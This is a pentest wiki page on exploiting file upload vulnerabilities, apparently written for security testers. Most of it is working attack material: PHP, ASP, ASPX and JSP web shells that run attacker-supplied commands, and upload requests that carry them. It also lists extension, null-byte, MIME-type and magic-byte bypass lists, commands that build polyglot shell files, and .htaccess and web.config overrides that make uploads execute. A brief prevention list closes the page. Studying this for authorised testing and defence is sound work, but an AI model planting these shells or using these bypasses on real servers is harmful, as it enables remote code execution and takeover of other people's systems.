---
title: File Upload Vulnerabilities
category: web-attacks
tags:
  - file-upload
  - web-shell
  - rce
  - extension-bypass
  - content-type-bypass
  - web-exploitation
last_updated: 2025-12-27
---

# File Upload Vulnerabilities

File upload vulnerabilities occur when web applications fail to properly validate uploaded files, allowing attackers to upload malicious content such as web shells, leading to remote code execution.

## Table of Contents

- [File Upload Basics](#file-upload-basics)
- [Extension Bypass Techniques](#extension-bypass-techniques)
- [Content-Type Bypass](#content-type-bypass)
- [Magic Bytes Bypass](#magic-bytes-bypass)
- [Web Shell Deployment](#web-shell-deployment)
- [Common Web Shells](#common-web-shells)
- [Server-Specific Techniques](#server-specific-techniques)
- [Tools and Automation](#tools-and-automation)

---

## File Upload Basics

### Identifying Upload Functionality

Look for upload forms in:
- User profile picture uploads
- Document/file sharing features
- Resume/CV uploads
- Avatar uploads
- Support ticket attachments
- Import/export functionality

### Basic Testing

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

---

## Extension Bypass Techniques

### Alternative PHP Extensions

```bash
# PHP alternative extensions
shell.php3
shell.php4
shell.php5
shell.php7
shell.pht
shell.phtm
shell.phtml
shell.phps
shell.phar
shell.phpt
shell.pgif
shell.inc
```

### Case Manipulation

```bash
shell.pHp
shell.Php
shell.PHP
shell.pHP
shell.PHp
```

### Double Extensions

```bash
shell.php.jpg
shell.php.png
shell.php.gif
shell.jpg.php
shell.png.php
shell.php.jpeg
shell.php.txt
```

### Null Byte Injection

Works on older systems (PHP < 5.3.4, older Java).

```bash
# Null byte in filename
shell.php%00.jpg
shell.php%00.png
shell.php\x00.gif

# URL encoded null byte
shell.php%2500.jpg
```

### Special Characters

```bash
# Semicolon bypass
shell.php;.jpg

# Trailing characters
shell.php.
shell.php..
shell.php...
shell.php/
shell.php\

# Space characters
shell.php%20
shell.php%0a
shell.php%0d%0a
shell.php%09

# Windows alternate data streams
shell.php::$DATA
shell.php:$I30:$INDEX_ALLOCATION
```

### Multiple Extensions

```bash
# Various combinations
shell.pHp5.jpg
shell.php5.png
shell.png.php5
shell.php%00.jpg
shell.php%20.jpg
shell.php.....jpg
shell.jpg.....php
```

### Server-Specific Extensions

**Apache:**
```bash
.htaccess      # Configuration override
shell.php.xxxx # Unknown extension may execute as PHP
```

**IIS:**
```bash
shell.asp
shell.aspx
shell.cer
shell.asa
shell.config
```

**Nginx:**
```bash
shell.php/x.jpg  # Path info vulnerability
```

---

## Content-Type Bypass

### Common Image MIME Types

```http
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: image/bmp
Content-Type: image/webp
Content-Type: image/svg+xml
```

### Bypassing Content-Type Checks

```http
# Original (blocked)
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

# Bypass with image MIME type
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

# Bypass with generic type
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream
```

### Using Burp Suite

1. Intercept the upload request
2. Modify `Content-Type` header from `application/x-php` to `image/jpeg`
3. Forward the request

---

## Magic Bytes Bypass

Magic bytes (file signatures) are the first bytes of a file that identify its type.

### Common File Signatures

```bash
# GIF
GIF87a  or  GIF89a
47 49 46 38 37 61  or  47 49 46 38 39 61

# JPEG
FF D8 FF E0  or  FF D8 FF E1

# PNG
89 50 4E 47 0D 0A 1A 0A

# BMP
42 4D

# PDF
25 50 44 46
```

### Adding Magic Bytes to Shell

```bash
# GIF magic bytes + PHP shell
GIF89a
<?php system($_GET['cmd']); ?>

# Create with echo
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php

# PNG magic bytes
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.png.php

# JPEG magic bytes
printf '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.jpg.php
```

### Polyglot Files

Create a valid image that also contains executable code.

```bash
# Create a valid GIF with PHP code in comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.gif
mv image.gif shell.php.gif

# Using JPEG EXIF data
exiftool -DocumentName='<?php system($_GET["cmd"]); ?>' image.jpg
```

---

## Web Shell Deployment

### Locating Upload Directory

```bash
# Check response for file path
# Look in HTML source for image paths
# Try common paths:
/uploads/
/upload/
/files/
/images/
/img/
/media/
/assets/
/static/uploads/
/user_uploads/
/attachments/
```

### Accessing the Shell

```bash
# Direct access
http://target.com/uploads/shell.php?cmd=id

# With path traversal
http://target.com/uploads/../shell.php?cmd=id

# Finding uploaded file
# Check for predictable naming patterns
# Use directory bruteforcing
```

### Overwriting Existing Files

```bash
# Attempt to overwrite .htaccess
Content-Disposition: form-data; name="file"; filename=".htaccess"

AddType application/x-httpd-php .gif

# Attempt to overwrite configuration
Content-Disposition: form-data; name="file"; filename="../config.php"
```

---

## Common Web Shells

### Simple PHP Web Shells

```php
# One-liner
<?php system($_GET['cmd']); ?>

# With error suppression
<?php @system($_GET['cmd']); ?>

# Using shell_exec
<?php echo shell_exec($_GET['cmd']); ?>

# Using passthru
<?php passthru($_GET['cmd']); ?>

# Using exec
<?php echo exec($_GET['cmd']); ?>

# Using backticks
<?php echo `$_GET['cmd']`; ?>

# POST parameter
<?php system($_POST['cmd']); ?>
```

### Bypassing Disabled Functions

```php
<?php
// Check which functions are available
$functions = ['system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open'];
foreach ($functions as $func) {
    if (function_exists($func)) {
        echo "$func is available\n";
    }
}
?>
```

```php
<?php
// Using proc_open
$descriptors = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open($_GET['cmd'], $descriptors, $pipes);
echo stream_get_contents($pipes[1]);
?>
```

### ASP/ASPX Web Shells

```asp
<!-- ASP shell -->
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = request("cmd")
szTempFile = "C:\" & oFileSys.GetTempName()
Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
Set oFile = oFileSys.OpenTextFile(szTempFile, 1)
Response.Write oFile.ReadAll()
oFile.Close
oFileSys.DeleteFile(szTempFile)
%>
```

```aspx
<!-- ASPX shell -->
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request["cmd"];
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + cmd;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.Start();
Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
%>
```

### JSP Web Shell

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    InputStream in = p.getInputStream();
    BufferedReader br = new BufferedReader(new InputStreamReader(in));
    String line;
    while ((line = br.readLine()) != null) {
        output += line + "\n";
    }
}
out.println("<pre>" + output + "</pre>");
%>
```

### Full-Featured Shells

```bash
# Popular PHP shells
p0wny-shell    # Single-file PHP shell
weevely        # PHP backdoor generator
c99/r57        # Legacy but still used
WSO            # Web Shell by Orb

# Finding shells
/usr/share/webshells/
/usr/share/seclists/Web-Shells/
```

---

## Server-Specific Techniques

### Apache .htaccess Tricks

```apache
# Upload .htaccess to enable PHP in other extensions
AddType application/x-httpd-php .gif
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .txt

# Make all files executable as PHP
AddHandler application/x-httpd-php .php .gif .jpg .png

# Enable PHP in specific directory
<FilesMatch "shell.gif">
    SetHandler application/x-httpd-php
</FilesMatch>
```

### IIS web.config

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*"
              modules="IsapiModule"
              scriptProcessor="%windir%\system32\inetsrv\asp.dll"
              resourceType="Unspecified"
              requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
```

### Nginx Path Processing

```bash
# Path info vulnerability
# If upload goes to /uploads/shell.gif
# Try accessing:
http://target.com/uploads/shell.gif/x.php
http://target.com/uploads/shell.gif/.php
```

---

## Tools and Automation

### Fuxploider

```bash
# Automatic file upload vulnerability scanner
git clone https://github.com/almandin/fuxploider
python3 fuxploider.py --url http://target.com/upload.php
```

### Upload Scanner (Burp Extension)

- Automates extension and content-type bypass testing
- Tests multiple payload formats

### Manual Testing Checklist

```bash
# 1. Test allowed extensions
.php, .php5, .phtml, .phar

# 2. Test case sensitivity
.PHP, .PhP, .pHp

# 3. Test double extensions
.php.jpg, .jpg.php

# 4. Test null byte
.php%00.jpg

# 5. Test Content-Type manipulation
Change to image/jpeg, image/png

# 6. Test magic bytes
Add GIF89a, PNG headers

# 7. Test special characters
.php., .php;, .php%20

# 8. Test .htaccess upload
If Apache, try to change config

# 9. Test path traversal in filename
../../../shell.php
```

---

## Prevention and Remediation

1. **Whitelist Extensions**: Only allow specific safe extensions
2. **Validate MIME Type**: Check both Content-Type and magic bytes
3. **Rename Files**: Generate random filenames on upload
4. **Separate Storage**: Store uploads outside web root
5. **Disable Execution**: Remove execute permissions on upload directory
6. **File Size Limits**: Implement maximum file size restrictions
7. **Antivirus Scanning**: Scan uploaded files for malware
8. **Content Security Policy**: Restrict script execution

---

## References

- [OWASP Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [PayloadsAllTheThings - Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [HackTricks - File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
